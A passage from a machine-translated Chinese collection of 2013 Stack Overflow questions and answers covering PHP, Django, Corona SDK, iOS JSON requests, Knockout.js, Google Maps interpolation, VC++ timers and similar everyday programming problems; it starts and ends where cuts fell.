3.  单任务
4.  单实例

[http://developer.android.com/guide/topics/manifest/activity-element.html#lmode](http://developer.android.com/guide/topics/manifest/activity-element.html#lmode)。

但是一旦活动被破坏并且您需要导航到该活动，该活动就会重新创建。

# php - 选择中的嵌套选项

> ID：15825526
> 
> 赞同：1
> 
> 时间：2013-04-05T03:41:40.603
> 
> 标签：php, arrays, select, nested, option

我正在制作一个分类系统。我已经创建了我的递归函数和一个在列表中显示我的类别的函数 ( `<ul>`)。列表一切正常，每个子元素都向右移动......等等......

但现在我需要对`<select>`. 这是我到目前为止所做的：

```
private function _toHtml(&$list, $parent=-1, $pass = 0){
    $foundSome = false;
    for( $i=0,$c=count($list);$i<$c;$i++ ){
        $delay = '';
        if( $list[$i]['parent_id']==$parent ){
            if( $foundSome==false ){
                $delay .= str_repeat("--", $pass);
                $foundSome = true;
            }    
            echo '<option value="'. $list[$i]['id'] .'">'. $delay . $list[$i]['name'] .'</option>';
            $this->_toHtml($list,$list[$i]['id'],$pass+1);
        }
    }
} 
```

问题是，这只适用于第一个子元素，其他的根本没有考虑。它看起来基本上是这样的：

```
Cinema
--English (sub cat for Cinema)
French (also a sub cat for Cinema) 
```

当我期望拥有：

```
Cinema
--English (sub cat for Cinema)
--French (also a sub cat for Cinema) 
```

任何的想法？

谢谢你的帮助

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-05T04:18:36.213

每当您遇到此类问题时，请更加直截了当，忘记任何过早的优化。通过减少变量的嵌套和正确命名来简化您的函数。

```
private function _toHtml($list, $parent = -1, $level = 0)
{
    foreach ($list as $entry) {
        if ($entry['parent_id'] != $parent) {
            continue;
        }
        printf('<option value="%s">%s%s</option>',
            $entry['id'],
            str_repeat('--', $level),
            $entry['name']
        );
        $this->_toHtml($list, $entry['id'], $level + 1);
    }
} 
```

# python - Django中的模板目录逻辑

> ID：15825528
> 
> 赞同：4
> 
> 时间：2013-04-05T03:41:59.390
> 
> 标签：python, django

一段时间以来，我一直在玩弄模板，我喜欢 django 体验的每一刻。*但是，既然 django 是一个松耦合*的大粉丝，我想知道，为什么没有这段代码：

```
import os
import platform
if platform.system() == 'Windows':
    templateFiles = os.path.join(os.path.dirname(__file__), '..', 'templates').replace('\\','/')
else:
    templateFiles = os.path.join(os.path.dirname(__file__), '..', 'templates')
TEMPLATE_DIRS = (
    # This includes the templates folder
    templateFiles,
) 
```

代替：

```
import os
TEMPLATE_DIRS = (
    templateFiles = os.path.join(os.path.dirname(__file__), '..', 'templates').replace('\\','/')
) 
```

第一个示例不会比第二个更好地遵循松散耦合的理念（我相信它确实如此），如果是这样，为什么 django 默认使用第二个代码示例而不是第一个？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-05T11:03:12.903

你问，“为什么 django 默认使用第二个代码示例？” 但是在 Django 1.5 中，当我运行时

```
$ django-admin.py startproject mysite 
```

我发现其中`settings.py`包含：

```
TEMPLATE_DIRS = (
    # Put strings here, like "/home/html/django_templates" or "C:/www/django/templates".
    # Always use forward slashes, even on Windows.
    # Don't forget to use absolute paths, not relative paths.
) 
```

所以我不确定你的示例代码来自哪里：它不是 Django 的默认值。

在非 Windows 系统上，很难在目录名称中找到反斜杠，因此您的第二个示例可能适用于所有实际情况。如果我必须防弹，我会写：

```
import os
BASE_DIR = os.path.abspath(os.path.join(os.path.dirname(__file__), os.pardir))
TEMPLATE_DIR = os.path.join(BASE_DIR, 'templates')
if os.sep != '/':
    # Django says, "Always use forward slashes, even on Windows."
    TEMPLATE_DIR = TEMPLATE_DIR.replace(os.sep, '/')
TEMPLATE_DIRS = (TEMPLATE_DIR,) 
```

（使用名称[`os.pardir`](http://docs.python.org/3/library/os.html#os.pardir)并[`os.sep`](http://docs.python.org/3/library/os.html#os.sep)明确我的意图。）

# lua - Corona SDK 中的动画标签

> ID：15825530
> 
> 赞同：1
> 
> 时间：2013-04-05T03:42:09.137
> 
> 标签：lua, coronasdk

是否可以在 Corona SDK 中为标签创建某种动画？我想让一个文本看起来很大，然后位置会在它出现并缩小后移动？我不想使用图片，因为标签上的文字会发生变化。如果可能的话，请您指出正确的方向吗？谢谢你。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-05T04:08:05.270

这就是你要找的..？

```
local label = display.newText("Label_1",50,100,nil,20)

local function transition_3()
   label.text = "Label_3"
   transition.to(label,{time=1000,xScale=1,yScale=1})
end
local function transition_2()
   label.text = "Label_2"
   transition.to(label,{time=1000,x=label.x+50,y=label.y+50,onComplete=transition_3})
end
transition.to(label,{time=1000,xScale=1.5,yScale=1.5,onComplete=transition_2}) 
```

继续编码............ :)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-05T04:15:25.123

krs 所说的——基本上，文本对象就像图像一样是显示对象。您可以对文本对象做任何可以对图像做的事情。

# json - 如何在IOS6的JSON解析中获取和插入数据

> ID：15825533
> 
> 赞同：1
> 
> 时间：2013-04-05T03:42:42.907
> 
> 标签：json, ios6, iphone-5

如何在IOS6的JSON解析中获取和插入数据

我正在尝试使用 JSONParser 将数据插入 JSON 链接并从 JSON 链接检索数据。

如何在 IOS6 中不添加 JSON 框架的情况下使用 JSON Parser。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-15T18:38:02.833

“不添加 JSON 框架”是什么意思？是不是说要自己解析JSON？当有好的图书馆存在时，你为什么要重新发明轮子？

我推荐[JSONKit](https://github.com/johnezang/JSONKit)，一个快速且编写良好的 Objective-C 库。您只需在项目中包含两个文件，您就可以从 JSON 中解析和序列化数据。

如果您想学习 JSON 并想创建自己的库以用于学习目的，请首先阅读[本文](http://en.wikipedia.org/wiki/JSON)以了解 JSON 是什么以及它的语法是什么。从这里您可以考虑如何将字典实现为 JSON（甚至对象为 JSON）。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-17T05:34:41.397

首先你需要导入 JSON 文件，你会从[这里得到](https://github.com/groopd/SBJSON-library/tree/master/JSON)

然后，如果您使用的是 POST 方法，请执行以下操作：

```
NSString *myRequestString = [NSString stringWithFormat:@"u=%@&p= %@",strUname,strPassword];
myRequestString=[myRequestString stringByReplacingOccurrencesOfString:@" " withString:@""];
NSData *myRequestData = [NSData dataWithBytes:[myRequestString UTF8String] length:[myRequestString length]];

NSMutableURLRequest *request = [[NSMutableURLRequest alloc] initWithURL:[NSURL URLWithString: @"Your Webservice URL"]];
[request setHTTPMethod:@"POST"];
[request setHTTPBody:myRequestData];

NSData *returnData = nil;
returnData = [NSURLConnection sendSynchronousRequest:request returningResponse:nil error:nil];
[request setValue:@"application/x-www-form-urlencoded" forHTTPHeaderField:@"content-type"];
NSDictionary *myDic = [NSJSONSerialization JSONObjectWithData:returnData options:NSJSONReadingMutableLeaves error:nil]; 
```

如果您使用的是 GET 方法，请使用以下方法：

```
NSData *data = [NSData dataWithContentsOfURL:[NSURL URLWithString:[NSString stringWithFormat:@"Your WebService with Parameters in URL"]]];
NSDictionary *MyDic = [NSJSONSerialization JSONObjectWithData:data options:NSJSONReadingMutableLeaves error:nil]; 
```

希望这会有所帮助。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-08-16T09:43:31.670

```
NSString *Post=[NSString stringWithFormat:@"email=%@&username=%@&password=%@",,Text_Email.text,Text_User.text,Text_Password.text];
NSData *PostData = [Post dataUsingEncoding:NSUTF8StringEncoding allowLossyConversion:NO];
NSString *PostLengh=[NSString stringWithFormat:@"%d",[Post length]];
NSURL *Url=[NSURL URLWithString:[NSString stringWithFormat:@"%@usersignup.php",ServerPath]];

NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:Url     cachePolicy:NSURLRequestUseProtocolCachePolicy timeoutInterval:60.0]; 
[request setHTTPMethod:@"POST"];
[request setValue:PostLengh forHTTPHeaderField:@"Content-Lenght"];
[request setHTTPBody:PostData];

NSData *ReturnData =[NSURLConnection sendSynchronousRequest:request returningResponse:Nil error:Nil];     
NSString *Response = [[NSString alloc] initWithData:ReturnData encoding:NSUTF8StringEncoding];     
Response = [Response stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceAndNewlineCharacterSet]]; 
```

# knockout.js - Knockout.js 绑定到下拉列表

> ID：15825539
> 
> 赞同：2
> 
> 时间：2013-04-05T03:43:04.977
> 
> 标签：knockout.js

尝试将数据绑定到下拉列表，

```
 function EmailTemplate(data) {
        var self = this;
        self.etId = ko.observable(data.email_template_id);
        self.etTypeId = ko.observable(data.email_template_type_id);
        self.etTitle = ko.observable(data.email_template_title);
        self.etContent = ko.observable(data.email_template_content);
        self.etAppYear = ko.observable(data.app_year);
        self.etSubject = ko.observable(data.subject);
        self.etActive = ko.observable(data.active);
    }

    function EmailTemplateViewModel() {
        var self = this;
        self.ETList = ko.observableArray();

        var uri = '/admin/services/EmailTemplateService.svc/EmailTemplates';
        OData.read(uri, function (data, response) {
            $.each(data.results, function (index, item) {
                self.ETList.push(new EmailTemplate(item));
            });
        });
    }
    $(document).ready(function () {
        ko.applyBindings(new EmailTemplateViewModel());            
    }); 
```

HTML 标记：

```
 <select data-bind="options: ETList, value:etId, optionsText: 'etTitle' "class="dropdown"></select> 
```

当我运行它时，我得到：未捕获的错误：无法解析绑定。消息：ReferenceError：etIdis 未定义；绑定值：选项：ETList，值：etId，optionsText：'etTitle'

当我们绑定到下拉列表时，我们应该如何绑定值？在绑定之后，我们应该如何在 Knockout 中捕获或创建下拉更改事件？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-05T04:29:55.143

使用`<select>`选项时，`value`绑定将确定选择了哪个选项，通常您会希望在您的视图模型（例如`selectedTemplate`）中设置一个可观察的对象。然后这个 observable 将自动映射到 observable 数组中的实际对象。设置`value: etId`没有意义，因为`etId`您的根视图模型中没有。

示例：http: [//jsfiddle.net/antishok/968Gy/](http://jsfiddle.net/antishok/968Gy/)

```
function EmailTemplateViewModel() {
    var self = this;
    self.ETList = ko.observableArray();
    self.selectedTemplate = ko.observable();
    // ...
} 
```

HTML：

```
<select data-bind="options: ETList, value:selectedTemplate, optionsText: 'etTitle'" class="dropdown"></select> 
```

您可能打算使用`optionsValue: 'etId'`哪种方法，但通常是一种不太可取的方法（因为现在将 observable 的值设置为 ID 而不是实际对象）

# iphone - UIWebView 错误中的自定义链接

> ID：15825540
> 
> 赞同：0
> 
> 时间：2013-04-05T03:43:05.853
> 
> 标签：iphone, ios, objective-c, xcode, uiwebview

我有一个 UIWebView，其自定义链接类似于 Instagram 的 @username 提及。但是，当链接被按住时，Apple 的默认对话框会弹出，要求打开链接。我该如何防止这种情况？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-05T04:04:25.690

这是在系统范围内**长按**任何链接的默认行为。

我不相信开发人员可以改变这一点。

# html - 如何使用 api 登录 reddit.com？

> ID：15825542
> 
> 赞同：0
> 
> 时间：2013-04-05T03:43:18.057
> 
> 标签：html, api, post, reddit

我不确定如何格式化我的请求 url 以使用 api 登录 reddit。我已经尝试过了，但我只是得到一个找不到页面的错误

```
https://ssl.reddit.com/api/login/?user=myusername&passwd=mypassword&api_type=json 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-08-02T15:10:33.403

参考[这个问题](https://stackoverflow.com/questions/8116825/i-am-unable-to-use-reddits-apis-to-log-in)。用户[Strelok](https://stackoverflow.com/users/2788/strelok)有一个很好的答案

```
public void someTest() throws IOException
    {
        URL u = new URL( "https://ssl.reddit.com/api/login/myusername" );
        login( u, "myusername", "mypassword" );
    }

    public static void login( URL url, String user, String pw ) throws IOException
    {

        String data = "api_type=json&user=" + user + "&passwd=" + pw;
        HttpURLConnection ycConnection = null;
        ycConnection = ( HttpURLConnection ) url.openConnection();
        ycConnection.setRequestMethod( "POST" );
        ycConnection.setDoOutput( true );
        ycConnection.setUseCaches( false );
        ycConnection.setRequestProperty( "Content-Type",
            "application/x-www-form-urlencoded; charset=UTF-8" );
        ycConnection.setRequestProperty( "Content-Length", String.valueOf( data.length() ) );

        DataOutputStream wr = new DataOutputStream(
            ycConnection.getOutputStream() );
        wr.writeBytes( data );
        wr.flush();
        wr.close();
        InputStream is = ycConnection.getInputStream();
        BufferedReader rd = new BufferedReader( new InputStreamReader( is ) );
        String line;
        StringBuffer response = new StringBuffer();
        while ( ( line = rd.readLine() ) != null )
        {
            response.append( line );
            response.append( '\r' );
        }
        for ( Entry< String, List< String >> r : ycConnection.getHeaderFields().entrySet() )
        {
            System.out.println( r.getKey() + ": " + r.getValue() );
        }
        rd.close();
        System.out.println( response.toString() );
    } 
```

# algorithm - 如何从 trie 构建 DAWG？

> ID：15825543
> 
> 赞同：2
> 
> 时间：2013-04-05T03:43:19.153
> 
> 标签：algorithm, data-structures, trie, dawg

我只是为一个词汇构建了一个[trie](http://en.wikipedia.org/wiki/Trie)，然后我发现有许多分支共享相同的结构。我想将它们组合在一起成为一个[DAWG](http://en.wikipedia.org/wiki/Deterministic_acyclic_finite_state_automaton)。

我将使用什么算法将 trie 转换为 DAWG？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-05T05:00:02.113

将 trie 转换为 DAWG 的标准算法通过将 trie 视为[确定性有限自动机](http://en.wikipedia.org/wiki/Deterministic_finite_automaton)，然后将 trie 转换为[最小状态 DFA 来](http://en.wikipedia.org/wiki/DFA_minimization)工作。

有许多算法可以执行这种转换。我最熟悉[的算法是 Hopcroft 算法](http://en.wikipedia.org/wiki/DFA_minimization#Hopcroft.27s_algorithm)，它通过查找可区分状态对并将不可区分状态组合在一起来工作。

希望这可以帮助！

# c# - windows窗体将自动在后台运行

> ID：15825550
> 
> 赞同：-6
> 
> 时间：2013-04-05T03:43:53.757
> 
> 标签：c#, .net, windows-applications

我开发了一个像这样的windows窗体

```
Source Folder:         Destination Folder:
    Start Button 
```

我还在每 2 分钟程序运行后设置了一个计时器。而且我还在启动文件夹中移动了应用程序的快捷方式。现在我想要的是在我第一次按下开始按钮后程序表单将关闭但会在后台运行，而且每次我登录 PC 时 .exe 都会在后台自动运行。我的意思是我第一次按下开始按钮后我想要的表单永远不会出现在 UI 中，它总是在后台运行。请帮助我如何做到这一点。如果您不理解我的查询，请告诉我。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-05T05:22:30.973

你真的需要加强你的沟通。问题措辞非常糟糕。有 2 个选项，通过进程或 Windows 启动中的命令行

```
ProcessStartInfo psi = new ProcessStartInfo(realCMD.ToString(),realARGS.ToString());
                    if (domainName != null)
                        psi.Domain = domainName;
                    psi.UserName = realUsername;
                    psi.Password = securePassword;
                    psi.CreateNoWindow = true; 
                    psi.UseShellExecute = false; 
```

如果我们这样做，执行时总是会显示一个窗口。

在 Windows 中从命令行启动程序的命令是“start”

启动一个单独的窗口以运行指定的程序或命令。

```
START ["title"] [/D path] [/I] [/MIN] [/MAX] [/SEPARATE | /SHARED]
      [/LOW | /NORMAL | /HIGH | /REALTIME | /ABOVENORMAL | /BELOWNORMAL]
      [/AFFINITY <hex affinity>] [/WAIT] [/B] [command/program]
      [parameters]

    "title"     Title to display in  window title bar.
    path        Starting directory
    B           Start application without creating a new window. The
                application has ^C handling ignored. Unless the application
                enables ^C processing, ^Break is the only way to interrupt
                the application
    I           The new environment will be the original environment passed
                to the cmd.exe and not the current environment.
    MIN         Start window minimized
    MAX         Start window maximized
    SEPARATE    Start 16-bit Windows program in separate memory space
    SHARED      Start 16-bit Windows program in shared memory space
    LOW         Start application in the IDLE priority class
    NORMAL      Start application in the NORMAL priority class
    HIGH        Start application in the HIGH priority class
    REALTIME    Start application in the REALTIME priority class
    ABOVENORMAL Start application in the ABOVENORMAL priority class
    BELOWNORMAL Start application in the BELOWNORMAL priority class
    AFFINITY    The new application will have the specified processor
                affinity mask, expressed as a hexadecimal number.
    WAIT        Start application and wait for it to terminate 
```

您可能希望使用 MIN 选项来启动最小化的程序

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-12-12T13:35:34.420

Hide() 在应用程序启动时加载之前的窗口。在 google 上查找 regedit start with windows c# 以获取有关如何使用 windows 启动应用程序的示例，并使用 Timer 类每 x 分钟显示一次应用程序并使用 Show() 显示它。

要使其在隐藏时看起来好像根本没有窗口，请禁用任务栏图标，禁用通知托盘图标，并将在任务栏中显示设置为 false。

或者

也许更好的方法是在程序首次启动时在 Windows 任务计划程序中创建一个任务，上面写着“每 x 分钟打开我的应用程序。”。当你的应用程序打开时，做你的工作，当工作完成时，或者当用户退出时，退出应用程序，应用程序将在下一个预定时间再次打开。

# javascript - 谷歌地图 - 沿着直线折线获得 X% 的纬度

> ID：15825555
> 
> 赞同：4
> 
> 时间：2013-04-05T03:44:10.327
> 
> 标签：javascript, google-maps, google-maps-api-3, google-polyline

我需要沿其他两个纬度/经度点之间的直线折线段以 X 百分比获取位置的纬度/经度。

到目前为止，我最接近的是使用以下内容（沿线占 40%）：

```
google.maps.geometry.spherical.interpolate(startLatLng, endLatLng, 0.4); 
```

这对于短距离非常有效，但是对于长折线段，返回的 latlng 超出折线行进的位置，因为它计算的是沿地球表面的最短距离，而不是平面地图上的最短距离。

对此的任何帮助将不胜感激，希望我只是遗漏了一些明显的东西。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-05T04:55:14.490

必须有一些经过验证和测试的方法可以做到这一点，但您可以使用 Maps API 做到这一点：

1.  将 lat/lng 坐标转换为像素
2.  在像素平面内插值
3.  转换回 lat/lng

这很简单。一个麻烦是弄清楚如何处理穿过 180 子午线或极点的线。

下面是一些经过半测试的代码，可以为您提供一个起点：

```
function mercatorInterpolate( map, latLngFrom, latLngTo, fraction ) {
    // Get projected points
    var projection = map.getProjection();
    var pointFrom = projection.fromLatLngToPoint( latLngFrom );
    var pointTo = projection.fromLatLngToPoint( latLngTo );
    // Adjust for lines that cross the 180 meridian
    if( Math.abs( pointTo.x - pointFrom.x ) > 128 ) {
        if( pointTo.x > pointFrom.x )
            pointTo.x -= 256;
        else
            pointTo.x += 256;
    }
    // Calculate point between
    var x = pointFrom.x + ( pointTo.x - pointFrom.x ) * fraction;
    var y = pointFrom.y + ( pointTo.y - pointFrom.y ) * fraction;
    var pointBetween = new google.maps.Point( x, y );
    // Project back to lat/lng
    var latLngBetween = projection.fromPointToLatLng( pointBetween );
    return latLngBetween;
} 
```

我不是 100% 确定处理穿过 180 经线的线的部分，但在我尝试的几个快速测试中它工作正常。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-05T04:55:38.003

[请参阅Google Maps API v3 组中的](http://groups.google.com/group/google-maps-js-api-v3/browse_frm/thread/a6fe7d22d50de69f/0f244232f2a9c6f1#0f244232f2a9c6f1)此讨论

这个[例子](http://www.geocodezip.com/v3_polyline_example_geodesic_proj.html)来自它

这个建议的代码将投影考虑到中点：

```
google.maps.event.addListener(map, 'projection_changed', function() {
  var projection = map.getProjection();
  if (!projection) return;

  // Project
  var startLatLng = startMarker.getPosition();
  var endLatLng = endMarker.getPosition();
  var startPoint = projection.fromLatLngToPoint(startLatLng);
  var endPoint = projection.fromLatLngToPoint(endLatLng);

  // Average
  var midPoint = new google.maps.Point(
      (startPoint.x + endPoint.x) / 2,
      (startPoint.y + endPoint.y) / 2);

  // Unproject
  var midLatLng = projection.fromPointToLatLng(midPoint);
  midMarker.setPosition(midLatLng);

}); 
```

# visual-c++ - 2 使用 OnTimer(UINT_PTR ID) 和 vc++ 的计时器

> ID：15825560
> 
> 赞同：0
> 
> 时间：2013-04-05T03:44:42.043
> 
> 标签：visual-c++, timer

我想使用 2 个计时器，一个用于读取传感器，另一个用于向机器人发出命令，使用 Visual Studio VC++ 2010 类库。

如果单击按钮 1，则第一个计时器打开，第二个计时器使用按钮 3。

但是当我单击按钮 2 时，即使我没有按下按钮 1，我的读取传感器也在工作，反之亦然。

这是我的程序：

我的代码有什么问题？

```
const int cTimer1 = 1;
const int cTimer2 = 1;

 void CENVSConfigDlg::OnBnClickedButton1()
{
SetTimer(cTimer1,1000,NULL);
}

 void CENVSConfigDlg::OnBnClickedButton2()
{
KillTimer(cTimer1);
}

 void CENVSConfigDlg::OnBnClickedButton3()
{   
SetTimer(cTimer2,10,NULL);  
}

void CENVSConfigDlg::OnBnClickedButton4()
{
    KillTimer(cTimer2);
}

void CENVSConfigDlg::OnTimer(UINT_PTR ID){
if(ID==cTimer1){

    char buffer[30],tempStr[5];
    int sensor[6];

    DWORD nbytes;

    MessageBeep(0);

    //Read Sensors

    if(!WriteFile( hnd_serial, "1", 1, &nbytes, NULL )){KillTimer(cTimer1);MessageBox(L"Write Com Port fail!");return;}
    Sleep(30);
    if(!ReadFile( hnd_serial, buffer, 30, &nbytes, NULL )){KillTimer(cTimer1);MessageBox(L"Read Com Port fail!");return;}
    Sleep(300);

if(ID==cTimer2)
{
    if(GetAsyncKeyState(0x53) != 0)
 {
 DWORD nbytes;
if(!WriteFile( hnd_serial, "s", 1, &nbytes, NULL )){MessageBox(L"Write Com Port fail!");return;}
    Sleep(30);
 tampil.SetWindowText( (LPCTSTR)"s" ); //backward
 }

else if(GetAsyncKeyState(0x57) != 0)
{
    DWORD nbytes;
if(!WriteFile( hnd_serial, "w", 1, &nbytes, NULL )){MessageBox(L"Write Com Port fail!");return;}
    Sleep(30);
    tampil.SetWindowText( (LPCTSTR)"w" );//forward
}

}

}

} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-06T09:36:11.990

发现自己的错误很好。但是您的代码仍然存在一些故障。

*   您正在计时器（`WM_TIMER`消息）本身中执行读、写、睡眠。这将导致 UI 线程冻结。您最好使用另一个线程来处理，这涉及到 UI 更新以外的其他内容。
*   您的计时器 ID 命名为等`Timer1`，`Timer2`这对程序员不友好。您应该使用更好的名称来反映实际含义。
*   多个计时器不会同时工作。同样，您最好使用多线程！

# php - 为 PHP 配置 Imagick

> ID：15825561
> 
> 赞同：0
> 
> 时间：2013-04-05T03:44:50.407
> 
> 标签：php, imagemagick, imagick

我想为 PHP 配置 Imagick，但不知道如何。我有所有这些很棒的教程站点来学习如何配置这两个站点，但是当我阅读说明时我感到困惑。我不太擅长使用命令提示符，所以当一个方向说类似以下内容时，它会增加我的困惑：

转到imagick文件夹并输入“phpize && ./configure && make && make install”

**或者**

在根 PHP 源目录中运行 ./buildconf –force 以重建配置脚本

我想知道是否有人可以向我解释如何使用 Imagick 配置 PHP，但是用非技术用户可以遵循的明确指示来解释它。

以下是我目前正在使用的教程网站：

[http://www.ioncannon.net/php/75/how-to-compile-imagemagick-for-php-by-hand/](http://www.ioncannon.net/php/75/how-to-compile-imagemagick-for-php-by-hand/) [http://forum.directadmin.com/showthread.php?t=26443](http://forum.directadmin.com/showthread.php?t=26443)

到目前为止，我已经安装了 ImageMagick 的二进制版本并下载了 + 解压缩的 MagickWandForPHP-1.0.9-2

任何帮助，将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-05T04:00:04.327

Not using windows since...., but if I remember correctly look in c:/php/ LOOK FOR php.ini and add this extension=php_imagick.dll

edit:

found this.. [http://www.elxsy.com/2009/07/installing-imagemagick-on-windows-and-using-with-php-imagick/](http://www.elxsy.com/2009/07/installing-imagemagick-on-windows-and-using-with-php-imagick/)

and this for windows7 [How to install Imagick/imagemagick on windows 7](https://stackoverflow.com/questions/3036847/how-to-install-imagemagick-on-windows-7)

# php - Javascript Submit 未将 POST 发送到 php 文件

> ID：15825562
> 
> 赞同：4
> 
> 时间：2013-04-05T03:45:09.357
> 
> 标签：php, javascript, html, forms, post

我无法让我的 javascript 超链接按钮将数据发布到我的 php 表单电子邮件脚本。我尝试过几种不同的方法，但似乎没有任何效果。任何帮助表示赞赏。谢谢你。

我的表单代码：

```
<form id="form" action="contactform.php" method="POST" enctype="text/plain" >
      <fieldset>
        <label><strong>Your Name:</strong><input id="name" type="text" name="name">       </label>
        <label><strong>Your Phone Number:</strong><input id="phone" type="text" name="phone"></label>
        <label><strong>Your E-mail:</strong><input id="email" type="text" name="email"></label>
        <label><strong>Your Message:</strong><textarea id="message" name="message"></textarea></label>
        <div class="btns"><a href="contacts.html" class="button">Clear</a><a href="#" onclick="document.getElementById('form').submit();" class="button">Send</a></div>
      </fieldset>  
    </form> 
```

联系表格.php：

```
<?php

    var_dump($_POST);

    if (isset($_POST['form'])) {

    $name = $_POST['name'];
    $phone = $_POST['phone'];
    $visitor_email = $_POST['email'];
    $message = $_POST['message'];

    $email_from = 'emailaddress@gmail.com';
    $email_subject = "Contact Form Submission";
    $email_body = "Name: $name\n" . "Phone: $phone\n" . "Messge: $message";

    $to= 'emailaddress@gmail.com';
    $headers= "From: $email_from \r\n";
    $headers.= "Reply-To: $visitor_email \r\n";
    mail($to,$email_subject,$email_body,$headers);

    echo "Thank you for your interest. I will contact you shortly.";

    }else{
    echo "It didn't work.";
    }

    ?> 
```

另外，我在 php 的开头有 var_dump 仅用于调试目的。不会成为最终代码的一部分。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-04-05T03:53:02.253

从表单标签中删除`enctype="text/plain"`，PHP 不支持它。

请参阅：[method="post" enctype="text/plain" 不兼容？](https://stackoverflow.com/questions/7628249/method-post-enctype-text-plain-are-not-compatible)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-05T03:47:42.700

只需更换`a`标签如下。

```
<a href="Javascript:void(0);" 
```

并替换`document.forms["myForm"].submit();`

并添加`name="myForm"`到您的表单中。

**完整代码**

```
<form id="form" action="contactform.php" method="POST" name="myForm">
    <fieldset>
        <label><strong>Your Name:</strong><input id="name" type="text" name="name">       </label>
        <label><strong>Your Phone Number:</strong><input id="phone" type="text" name="phone"></label>
        <label><strong>Your E-mail:</strong><input id="email" type="text" name="email"></label>
        <label><strong>Your Message:</strong><textarea id="message" name="message"></textarea></label>
        <div class="btns">
            <a href="contacts.html" class="button">Clear</a>
            <a href="Javascript:void(0)" onclick="document.forms['myForm'].submit();" class="button">Send</a></div>
    </fieldset>  
</form> 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-05T03:53:30.730

虽然我知道这不能回答您的问题，但没有理由为此目的使用 Javascript（在上面的示例中），因为 HTML 输入元素将自动处理这两个函数。

```
<input type="reset" value="Clear" />
<input type="submit" value="Send" /> 
```

我只会做这样的事情来验证数据，然后我会使用`onsubmit`表单的操作（如果验证失败则返回 false）。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-05T03:51:43.197

这将起作用：

```
<a href="#" onclick="document.form.submit();" class="button">Send</a> 
```

您不需要`getElementById`，您可以通过这种方式简单地引用它。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-04-05T04:14:43.553

我对此进行了测试，它可以工作....

```
<html>
<body>
<form id="form" action="contactform.php" method="POST">
      <fieldset>
        <label><strong>Your Name:</strong><input name="name" type="text" name="name">       </label>
        <label><strong>Your Phone Number:</strong><input name="phone" type="text" name="phone"></label>
        <label><strong>Your E-mail:</strong><input name="email" type="text" name="email"></label>
        <label><strong>Your Message:</strong><textarea name="message" name="message"></textarea></label>
        <div class="btns"><a href="contacts.html" class="button">Clear</a><a href="#" onclick="document.forms[0].submit();" class="button">Send</a></div>
      </fieldset>  
    </form>
</body>
</html>

<?php

var_dump($_REQUEST);

echo  "<BR>";

foreach ( $_POST as $key => $value )
{
    echo $key . " " . "=" . " " . $value;
    echo  "<BR>";
}

?> 
```

您需要考虑的其他一些提示是：

*   不要使用`<strong>`. 而是像使用超链接一样使用 css 类。示例`label { font-weight:bold }`或`<label class='strong'>`
*   考虑使用 jquery 和不显眼的 javascript。例子`$("form").first().on("submit",function...`
*   不要在输入上应用标签。只需关闭标签标签，然后使用输入，或用于`<label for="input1">`匹配输入并在单击文本时启用复选框。
*   指定一个 name 属性，因为它是在 post 上发送到服务器的内容...id 用于浏览器中的脚本引用

# iphone - iPhone 6.1模拟器留下无法杀死的僵尸进程！

> ID：15825569
> 
> 赞同：1
> 
> 时间：2013-04-05T03:46:00.940
> 
> 标签：iphone, xcode, ios-simulator

我使用 xcode 的 iPhone 6.1 模拟器调试了我的应用程序。在我使用 xcode 的停止按钮停止我的应用程序后，我发现使用“ps ux”命令仍然可以看到一些虚拟进程。例如，我运行了一个名为“IAPNoob”的应用程序，当应用程序在模拟器上运行时，我可以看到一个进程：

```
Chandler   781   0.0  0.5   875156  20332   ??  SX   11:26上午   0:00.33
/Users/Chandler/Library/Application Support/iPhone Simulator/6.1/Applications/
29FAE7CA-3C0E-4B52-A916-572FEF640A76/IAPNoob.app/IAPNoob 
```

当我使用 xcode 的停止按钮停止应用程序时，过程转向：

```
Chandler   781   0.0  0.0        0      0   ??  Z    11:26上午   0:00.00 (IAPNoob) 
```

时间和时间，这种虚拟进程会导致我的系统非常缓慢。我尝试使用 kill -9 终止该进程，但它不起作用。谁能告诉我如何解决这个问题？

ps：我试图退出模拟器，但是这并不能杀死僵尸进程。

pps：我尝试了另一种方法通过双击模拟器上的“主页”按钮并终止应用程序来退出我的应用程序，但是它仍然会留下僵尸进程

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-05T04:07:13.847

我建议，当这种情况发生时，你重新启动计算机。当 Xcode 让事情变慢时，我就是这样做的。

此外，如果您认为这是一个问题，请向 Apple 提交错误！

就个人而言，我不认为这是一个问题。这是一个僵尸。这意味着它什么也没做。它已终止。它不能“减慢”您的计算机。它不使用任何计算机资源。[参见，例如：](http://www-cdf.fnal.gov/offline/UNIX_Concepts/concepts.zombies.txt)

> 僵尸或失效进程是已经终止的进程的死亡证明。它消耗的唯一系统资源是用于存储其终止状态的进程块

所以不要担心，要快乐。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-05T04:25:49.623

在活动监视器中强制退出模拟器

# java - 为什么我在 Java 中遇到 stackoverflow？

> ID：15825572
> 
> 赞同：1
> 
